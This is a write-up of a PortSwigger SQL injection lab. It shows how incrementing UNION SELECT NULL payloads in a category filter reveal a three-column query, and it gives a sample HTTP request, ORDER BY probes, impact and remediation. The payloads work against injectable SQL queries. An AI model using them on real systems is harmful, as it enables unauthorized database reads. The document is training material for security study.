# SQL injection UNION attack, determining the number of columns returned by the query

**Category:** SQL injection
**Level:** Practitioner
**Mechanism:** UNION column count (NULL enumeration)
**Lab URL:** https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns

---

## Vulnerability

The product category filter builds a SQL query by concatenating the user-controlled
`category` value, so the input can break out of the string and inject SQL. Because
the query results are reflected in the response, this is exploitable with a `UNION`
attack. The first step of any `UNION` attack is to learn how many columns the
original query returns — a `UNION SELECT` must supply exactly the same number of
columns, or the database rejects it.

## Reconnaissance & Exploitation

The category filter issues a request like `GET /filter?category=Gifts`, and the
underlying query is roughly:

```sql
SELECT ... FROM products WHERE category = 'Gifts' AND released = 1
```

To find the column count I appended a `UNION SELECT` with a growing list of `NULL`
values. `NULL` is used because it is compatible with any data type, so the only thing
that makes the query fail or succeed is the *number* of columns matching:

```
category=Gifts'+UNION+SELECT+NULL--            → error (column count mismatch)
category=Gifts'+UNION+SELECT+NULL,NULL--        → error
category=Gifts'+UNION+SELECT+NULL,NULL,NULL--   → 200, extra (empty) row returned
```

> Evidence (replace with your captured request/response when updating):

```http
GET /filter?category=Gifts'+UNION+SELECT+NULL,NULL,NULL-- HTTP/2
Host: <lab-id>.web-security-academy.net
```

```http
HTTP/2 200 OK
...
(response renders normally, with one additional row from the injected UNION)
```

The error disappeared at **three** `NULL`s, so the original query returns **3
columns**. The `--` comments out the trailing `AND released = 1` so it does not
interfere. Lab solved. This column count is the key that unlocks the following labs:
once you know it, you can swap a `NULL` for real data to extract it.

## Impact

On its own, determining the column count is reconnaissance, not damage. But it is the
enabling step for full `UNION`-based extraction: with the column count and a
string-compatible column known, an attacker reads arbitrary tables — usernames,
password hashes, any data the database user can reach. It confirms the input reaches
the SQL engine and the results are reflected, which is the difference between a
theoretical injection and a data breach.

## Remediation

- Use parameterised queries (prepared statements) for every database access that
  includes user input; the `category` value should be bound, never concatenated.
- Do not reflect raw query results in a way that lets an attacker observe injected
  rows; combined with parameterisation this removes the UNION channel.
- Apply least privilege to the database account so that, even if injection occurs, the
  reachable tables and columns are minimal.

## References

- **OWASP:** A03:2021 Injection
- **CWE:** CWE-89 (Improper Neutralization of Special Elements used in an SQL Command)

## Notes

- `NULL` everywhere because it casts to any type — isolates the *count* as the only
  variable while probing.
- Two ways to find the count: incrementing `UNION SELECT NULL,NULL,...` (used here) or
  `ORDER BY 1--`, `ORDER BY 2--`... until it errors. ORDER BY is often stealthier.
- `--` (with a trailing space in some DBs) comments out the rest of the original
  query, including the `AND released = 1` filter.